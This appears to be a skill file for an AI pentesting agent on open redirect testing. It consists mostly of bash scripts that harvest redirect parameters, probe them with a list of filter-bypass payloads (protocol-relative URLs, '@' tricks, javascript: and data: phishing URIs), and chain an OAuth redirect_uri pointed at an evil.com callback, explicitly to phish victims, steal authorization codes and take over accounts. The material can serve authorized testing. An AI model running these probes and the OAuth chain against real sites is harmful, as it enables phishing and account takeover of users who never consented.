---
name: vuln-open-redirect
description: "Open redirect testing — parameter-based redirect bypass, host header redirect, subdomain bypass, URL scheme bypass, phishing chain, OAuth redirect_uri abuse. Triggers: 'open redirect', 'url redirect', 'redirect bypass', 'redirect_uri', 'unvalidated redirect', 'redirect parameter', 'oauth redirect', 'host header redirect', 'phishing redirect'."
---

# Open Redirect Testing

Find unvalidated URL redirect parameters to enable phishing and OAuth ATO chains.

---

## Phase 1: Discovery

```bash
TARGET="https://TARGET"

# Collect redirect parameters from historical URLs:
gau "$TARGET" 2>/dev/null | grep -E '(redirect|return|next|url|goto|dest|destination|redir|redirect_to|redirect_uri|continue|target|back|location|to|from|link|out|r=)=' | sort -u | tee output/redirect_params.txt

# Also check response headers for Location patterns:
curl -s -I "$TARGET/login" | grep -i "location:"
curl -s -I "$TARGET/logout" | grep -i "location:"

# Find redirect endpoints:
ffuf -u "$TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 301,302,307,308 -o output/redirect_endpoints.json 2>&1
```

---

## Phase 2: Bypass Testing

```bash
TARGET="https://TARGET"
EVIL="https://evil.com"

# Common redirect parameters:
PARAMS=("redirect" "url" "next" "goto" "dest" "return" "redir" "redirect_to" "redirect_uri" "continue" "target" "back" "location" "to" "r")

for PARAM in "${PARAMS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET/login?$PARAM=$EVIL" --max-redirs 0)
  LOCATION=$(curl -s -I "$TARGET/login?$PARAM=$EVIL" | grep -i "^location:" | head -1)
  echo "$PARAM → $STATUS | $LOCATION"
done | tee output/redirect_test.txt

# Bypass filter techniques:
BYPASSES=(
  "https://evil.com"
  "//evil.com"
  "////evil.com"
  "/\evil.com"
  "https:evil.com"
  "https://evil.com%20"
  "https://evil.com%09"
  "https://evil.com#"
  "https://target.com.evil.com"
  "https://evil.com?target.com"
  "https://evil.com;target.com"
  "https://target.com@evil.com"
  "https://evil%E3%80%82com"  # unicode dot
  "@evil.com"
  "javascript:alert(1)"
  "data:text/html,<html>phishing</html>"
)

PARAM="redirect"
for B in "${BYPASSES[@]}"; do
  LOCATION=$(curl -s -I "$TARGET/login?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$B'))")" | grep -i "^location:" | head -1)
  echo "$B → $LOCATION"
done | tee output/redirect_bypass.txt
```

---

## Phase 3: OAuth Chain

```bash
TARGET="https://TARGET"
# If target uses OAuth and allows redirecting to attacker:

# Get authorization URL format from OIDC discovery:
curl -s "$TARGET/.well-known/openid-configuration" | jq -r '.authorization_endpoint'

# Craft malicious redirect_uri in OAuth flow:
AUTH_URL="https://auth.TARGET/oauth/authorize"
CLIENT_ID="known_client_id"

# Try open redirect in redirect_uri:
EVIL_URI="https://evil.com/callback"
curl -s "$AUTH_URL?client_id=$CLIENT_ID&redirect_uri=$EVIL_URI&response_type=code" -I

# Chain: phish victim → steal OAuth code → ATO
```

---

## Output

Save to `output/`:
- `redirect_params.txt` — discovered redirect parameters
- `redirect_test.txt` — parameter probe results
- `redirect_bypass.txt` — bypass technique results

## Next Phase

→ `vuln-account-takeover` to demonstrate ATO impact
→ `vuln-oauth` for OAuth-specific redirect exploitation
